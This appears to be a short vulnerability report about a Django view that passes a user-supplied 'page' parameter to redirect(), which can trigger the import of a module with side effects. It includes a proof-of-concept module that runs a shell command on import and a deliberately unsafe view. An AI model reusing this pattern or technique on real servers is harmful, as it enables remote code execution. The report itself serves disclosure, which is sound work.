> 1. One or more views are present which construct a URL based on user input (commonly, a "next" parameter in a querystring indicating where to redirect upon successful completion of an action).
1. One or more modules are known to an attacker to exist on the server's Python import path, which perform code execution with side effects on importing.


In `tests.py`
```python
def evil_function():
    print("exploit successful")
    os.system("echo > /tmp/`whoami` ")
    return os.getuid()


evil = evil_function()
```

In `views.py`
```python
def redirect_test(request):
        page = request.GET.get('page', None)
        if page is not None:
                redirect(page)
        return HttpResponse("OK")
```

Use redirect function to call to the evil function
